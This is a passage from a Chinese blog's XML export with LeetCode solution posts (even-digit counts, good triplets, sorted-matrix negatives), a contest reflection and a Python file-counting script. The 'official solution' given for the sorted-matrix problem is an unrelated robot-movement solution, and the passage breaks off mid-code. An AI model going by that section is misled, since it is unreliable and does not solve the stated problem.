<h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>这次比赛虽然也打开网站，做题1个半小时，但是心太浮躁了，尤其是今天是周日是休息的日子，自己迟到了5、6分钟，刷题量少，也没什么信心，事情也有点多，数学、机器学习、论文等反正好多东西。最简单的一道题都没做出了根本就没思路，希望自己可以保持学习的激情，下次努力，一直坚持一定会有回报的😥</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>CONTEST</category>
      </categories>
      <tags>
        <tag>LeetCode周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>统计位数为偶数的数字</title>
    <url>/2020/11/09/%E7%BB%9F%E8%AE%A1%E4%BD%8D%E6%95%B0%E4%B8%BA%E5%81%B6%E6%95%B0%E7%9A%84%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/find-numbers-with-even-number-of-digits/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数数组 <code>nums</code>，请你返回其中位数为 <strong>偶数</strong> 的数字的个数。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [12,345,2,6,7896]</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">12 是 2 位数字（位数为偶数） </span><br><span class="line">345 是 3 位数字（位数为奇数）  </span><br><span class="line">2 是 1 位数字（位数为奇数） </span><br><span class="line">6 是 1 位数字 位数为奇数） </span><br><span class="line">7896 是 4 位数字（位数为偶数）  </span><br><span class="line">因此只有 12 和 7896 是位数为偶数的数字</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [555,901,482,1771]</span><br><span class="line">输出：1 </span><br><span class="line">解释： </span><br><span class="line">只有 1771 是位数为偶数的数字。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 500</code></li>
<li><code>1 &lt;= nums[i] &lt;= 10^5</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>1、因为<code>1&lt;=nums[i]&lt;=10^5</code>，所以位数为偶数只能有三种情况</p>
<ul>
<li>6位数，nums[i]等于100000</li>
<li>4位数，0&lt;nums[i]/1000&lt;10</li>
<li>2位数，0&lt;nums[i]/10&lt;10</li>
</ul>
<p>对这三种情况的数字进行计数即可。</p>
<p>2、另外也可以遍历数组，判断每一个整数的位数</p>
<p><strong>c++代码：</strong>(执行用时8ms，击败96.89%，内存消耗10M，击败17.69%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findNumbers</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> i:nums)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i==<span class="number">100000</span> || i/<span class="number">1000</span>!=<span class="number">0</span>&amp;&amp;i/<span class="number">1000</span>&lt;<span class="number">10</span> || i/<span class="number">10</span>!=<span class="number">0</span>&amp;&amp;i/<span class="number">10</span>&lt;<span class="number">10</span>)&#123;</span><br><span class="line">                ++result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/find-numbers-with-even-number-of-digits/solution/tong-ji-wei-shu-wei-ou-shu-de-shu-zi-by-leetcode-s/">官方题解</a>:</h6><p><strong>方法一：枚举 + 字符串</strong><br>我们枚举数组 <code>nums</code> 中的整数，并依次判断每个整数 <code>x</code> 是否包含偶数个数字。</p>
<p>一种简单的方法是使用语言内置的整数转字符串函数，将 <code>x</code> 转换为字符串后，判断其长度是否为偶数即可。</p>
<p><strong>c++代码：</strong>（执行16ms，击败43.91%，内存10M，击败12.53%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findNumbers</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (to_string(num).size() % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                ++ans;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(N)$，其中 $N$ 是数组 <code>nums</code> 的长度。这里假设将整数转换为字符串的时间复杂度为 $O(1)$。</p>
</li>
<li><p>空间复杂度：$O(1)$。</p>
</li>
</ul>
<p><strong>方法二：枚举 + 数学</strong><br>我们也可以使用语言内置的以 <code>10</code> 为底的对数函数 <code>log10()</code> 来得到整数 <code>x</code> 包含的数字个数。</p>
<p>一个包含 <code>k</code> 个数字的整数 <code>x</code> 满足不等式 $10^{k-1} ≤x&lt;10^k$ 。将不等式取对数，得到 $k - 1 \leq \log_{10}(x) &lt; k$，因此我们可以用 $k = \lfloor\log_{10}(x) + 1⌋$得到 <code>x</code> 包含的数字个数 <code>k</code>，其中 $\lfloor a ⌋$表示将 $a$ 进行下取整，例如 $\lfloor 5.2 \rfloor$ = 5⌊5.2⌋=5。</p>
<p><strong>c++代码：</strong>（执行20ms，击败16.37%，内存10.4M，击败5.09%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findNumbers</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">int</span>)(<span class="built_in">log10</span>(num) + <span class="number">1</span>) % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                ++ans;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>题目多种解法，官方题解第一种即是我思路里的第二种方法，也挺好不错。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>统计好三元组</title>
    <url>/2020/11/10/%E7%BB%9F%E8%AE%A1%E5%A5%BD%E4%B8%89%E5%85%83%E7%BB%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/count-good-triplets/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数数组 <code>arr</code> ，以及 <code>a</code>、<code>b</code> 、<code>c</code> 三个整数。请你统计其中好三元组的数量。</p>
<p>如果三元组 <code>(arr[i], arr[j], arr[k])</code> 满足下列全部条件，则认为它是一个 <strong>好三元组</strong> 。</p>
<ul>
<li><code>0 &lt;= i &lt; j &lt; k &lt; arr.length</code></li>
<li><code>|arr[i] - arr[j]| &lt;= a</code></li>
<li><code>|arr[j] - arr[k]| &lt;= b</code></li>
<li><code>|arr[i] - arr[k]| &lt;= c</code></li>
</ul>
<p>其中 <code>|x|</code> 表示 <code>x</code> 的绝对值。</p>
<p>返回 <strong>好三元组的数量</strong> 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [3,0,1,1,9,7], a &#x3D; 7, b &#x3D; 2, c &#x3D; 3</span><br><span class="line">输出：4</span><br><span class="line">解释：一共有 4 个好三元组：[(3,0,1), (3,0,1), (3,1,1), (0,1,1)] 。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [1,1,2,2,3], a &#x3D; 0, b &#x3D; 0, c &#x3D; 1</span><br><span class="line">输出：0</span><br><span class="line">解释：不存在满足所有条件的三元组。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>3 &lt;= arr.length &lt;= 100</code></li>
<li><code>0 &lt;= arr[i] &lt;= 1000</code></li>
<li><code>0 &lt;= a, b, c &lt;= 1000</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>暴力解法，三层for循环遍历，每层代表一个三元组中的元素。对每组(i,j,k)，判断arr[i]、arr[j]、arr[k]是否满足条件。</p>
<p>这种解法时间复杂度是$O(n^3)$，看题解有没有好方法吧。</p>
<p><strong>c++代码：</strong>(执行用时64ms，击败14.93%，内存消耗8.6M，击败5.00%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countGoodTriplets</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr, <span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//根据题目描述直接模拟即可</span></span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;arr.size()<span class="number">-2</span>;++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;arr.size()<span class="number">-1</span>;++j)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=j+<span class="number">1</span>;k&lt;arr.size();++k)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">abs</span>(arr[i]-arr[j])&lt;=a &amp;&amp; <span class="built_in">abs</span>(arr[j]-arr[k])&lt;=b &amp;&amp; <span class="built_in">abs</span>(arr[i]-arr[k])&lt;=c)&#123;</span><br><span class="line">                        ++result;</span><br><span class="line">                     &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/count-good-triplets/solution/tong-ji-hao-san-yuan-zu-by-leetcode-solution/">官方题解</a>:</h6><p><strong>方法一：枚举</strong><br><strong>思路与算法</strong></p>
<p>用 $O(n^3)$  的循环依次枚举所有的 $(i, j, k)$，这里 $0 \leq i &lt; j &lt; k &lt; {\rm arr.length}$，对于每组 (i, j, k)(i,j,k)，判断 ${\rm arr}[i]$、${\rm arr}[j]$、${\rm arr}[k]$是否满足条件。</p>
<p>最终统计出所有满足条件的三元组的数量。</p>
<p><strong>c++代码：</strong>（执行56ms，击败38.19%，内存8.4M，击败9.00%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countGoodTriplets</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr, <span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = arr.size(), cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = j + <span class="number">1</span>; k &lt; n; ++k) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">abs</span>(arr[i] - arr[j]) &lt;= a &amp;&amp; <span class="built_in">abs</span>(arr[j] - arr[k]) &lt;= b &amp;&amp; <span class="built_in">abs</span>(arr[i] - arr[k]) &lt;= c) &#123;</span><br><span class="line">                        ++cnt;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cnt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n^3)$，其中 $n$是数组 $\textit{arr}$ 的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<p><strong>方法二：枚举优化</strong></p>
<p><strong>思路与算法</strong></p>
<p>我们考虑 $O(n^2)$ 枚举满足 $|\rm arr[j]-\rm arr[k]|\le b∣$ 的二元组 $(j,k)$，统计这个二元组下有多少 $i$ 满足条件。由题目已知 $i$ 的限制条件为 $|\rm arr[i]-\rm arr[j]|\le a \ \&amp;\&amp;\ |\rm arr[i]-\rm arr[k]|\le c∣$，我们可以拆开绝对值，得到符合条件的值一定是 $[\rm arr[j]-a,\rm arr[j]+a]$ 和 $[\rm arr[k]-c,\rm arr[k]+c]$ 两个区间的交集，我们记为 $[l,r]$。因此，在枚举 $(j,k)$这个二元组的时候，我们只需要快速统计出满足 $i&lt;j$ 且 $\rm arr[i]$的值域范围在 $[l,r]$ 的 $i$ 的个数即可。</p>
<p>很容易想到维护一个 $\rm arr[i]$频次数组的前缀和 $\rm sum$，对于一个二元组 $(j,k)$，我们可以 $O(1)$ 得到答案为 $\rm sum[r]-\rm sum[l-1]$。考虑怎么维护保证当前频次数组存的数的下标符合 $i&lt;j$ 的限制，我们只要从小到大枚举 $j$，每次 $j$移动指针加一的时候，将 $\rm arr[j]$的值更新到 $\rm sum$数组中即可，这样能保证枚举到 $j$的时候 $\rm sum$数组里存的值的下标满足限制。</p>
<p>「将 $\rm arr[j]$ 的值更新到 $\rm sum$数组中」这个操作在本方法中是暴力更新，因为数组的值域上限很小，有能力的读者可以考虑怎么在进一步优化这一部分的复杂度，可以从离散化或者树状数组的角度考虑，这里不再赘述。</p>
<p><strong>c++代码：</strong>（执行24ms，击败97.15%，内存9M，击败5.00%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countGoodTriplets</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr, <span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>, n = arr.size();</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sum</span><span class="params">(<span class="number">1001</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = j + <span class="number">1</span>; k &lt; n; ++k) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">abs</span>(arr[j] - arr[k]) &lt;= b) &#123;</span><br><span class="line">                    <span class="keyword">int</span> lj = arr[j] - a, rj = arr[j] + a;</span><br><span class="line">                    <span class="keyword">int</span> lk = arr[k] - c, rk = arr[k] + c;</span><br><span class="line">                    <span class="keyword">int</span> l = max(<span class="number">0</span>, max(lj, lk)), r = min(<span class="number">1000</span>, min(rj, rk));</span><br><span class="line">                    <span class="keyword">if</span> (l &lt;= r) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (l == <span class="number">0</span>) &#123;</span><br><span class="line">                            ans += sum[r];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            ans += sum[r] - sum[l - <span class="number">1</span>];</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = arr[j]; k &lt;= <span class="number">1000</span>; ++k) &#123;</span><br><span class="line">                ++sum[k];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<p>时间复杂度：$O(n^2+nS)$，其中$n$ 是数组 $\textit{arr}$的长度，$S$为数组的值域上限，这里为 $1000$。</p>
<p>空间复杂度：$O(S)$。我们需要 $O(S)$ 的空间维护 $\rm arr[i]$频次数组的前缀和。</p>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>基本上简单题都可以通过暴力解出来，看来是真的😄，官方题解提供了另一种优化的枚举解法，可以学习一波。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>统计指定目录下文件数量</title>
    <url>/2020/11/17/%E7%BB%9F%E8%AE%A1%E6%8C%87%E5%AE%9A%E7%9B%AE%E5%BD%95%E4%B8%8B%E6%96%87%E4%BB%B6%E6%95%B0%E9%87%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这篇文章用python实现了<strong>统计指定目录下文件数量</strong>这样一个小功能，仅此记录一下</p>
<a id="more"></a>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">countFile</span>(<span class="params">dir</span>):</span></span><br><span class="line">    tmp = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> os.listdir(dir):</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(os.path.join(dir, item)):</span><br><span class="line">            tmp += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp += countFile(os.path.join(dir, item))</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="keyword">if</span>  __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(countFile(sys.argv[<span class="number">1</span>]))</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p>使用方法：</p>
<p><code>python countFile.py argv</code></p>
<p>注：argv参数是要统计的文件夹路径</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>统计有序矩阵中的负数</title>
    <url>/2020/11/13/%E7%BB%9F%E8%AE%A1%E6%9C%89%E5%BA%8F%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E8%B4%9F%E6%95%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/count-negative-numbers-in-a-sorted-matrix/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个 <code>m * n</code> 的矩阵 <code>grid</code>，矩阵中的元素无论是按行还是按列，都以非递增顺序排列。 </p>
<p>请你统计并返回 <code>grid</code> 中 <strong>负数</strong> 的数目。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：grid &#x3D; [[4,3,2,-1],[3,2,1,-1],[1,1,-1,-2],[-1,-1,-2,-3]]</span><br><span class="line">输出：8</span><br><span class="line">解释：矩阵中共有 8 个负数。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：grid &#x3D; [[3,2],[1,0]]</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：grid &#x3D; [[1,-1],[-1,-1]]</span><br><span class="line">输出：3</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：grid &#x3D; [[-1]]</span><br><span class="line">输出：1</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>m == grid.length</code></li>
<li><code>n == grid[i].length</code></li>
<li><code>1 &lt;= m, n &lt;= 100</code></li>
<li><code>-100 &lt;= grid[i][j] &lt;= 100</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>要是暴力点就直接遍历矩阵中所有的元素，统计负数的个数。</p>
<p>优雅点呢就是利用矩阵的特点，非递增排列（对每行每列前者&gt;=后者），遍历每一行，对每一个元素如果小于0，则该行其后元素都是负数。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败100.00%，内存消耗8.2M，击败29.59%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countNegatives</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;grid.size();++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;grid[i].size();++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(grid[i][j]&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                    result+=grid[i].size()-j;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/count-negative-numbers-in-a-sorted-matrix/solution/tong-ji-you-xu-ju-zhen-zhong-de-fu-shu-by-leetcode/">官方题解</a>:</h6><p><strong>方法一： 模拟</strong></p>
<p><strong>思路与算法</strong></p>
<p>我们只需按指令模拟机器人移动的坐标即可。起始时机器人的坐标为 $(0,0)$，在遍历完所有指令并对机器人进行移动之后，判断机器人的坐标是否为 $(0,0)$ 即可。</p>
<p>具体来说，我们用两个变量 xx 和 yy 来表示机器人当前所在的坐标为 $(x,y)$，起始时 $x=0$，$y=0$。接下来我们遍历指令并更新机器人的坐标：</p>
<p>如果指令是 $U$，则令 $y=y-1$<br>如果指令是 $D$，则令 $y=y+1$<br>如果指令是 $L$，则令 $x=x-1$<br>如果指令是 $R$，则令 $x=x+1$<br>最后判断 $(x,y)$ 是否为 $(0,0)$即可。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败97.42%，内存消耗8.3M，击败5.04%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">judgeCircle</span><span class="params">(<span class="built_in">string</span> moves)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; move: moves) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move == <span class="string">&#x27;U&#x27;</span>) &#123;</span><br><span class="line">                y--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (move == <span class="string">&#x27;D&#x27;</span>) &#123;</span><br><span class="line">                y++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (move == <span class="string">&#x27;L&#x27;</span>) &#123;</span><br><span class="line">                x--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (move == <span class="string">&#x27;R&#x27;</span>) &#123;</span><br><span class="line">                x++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span 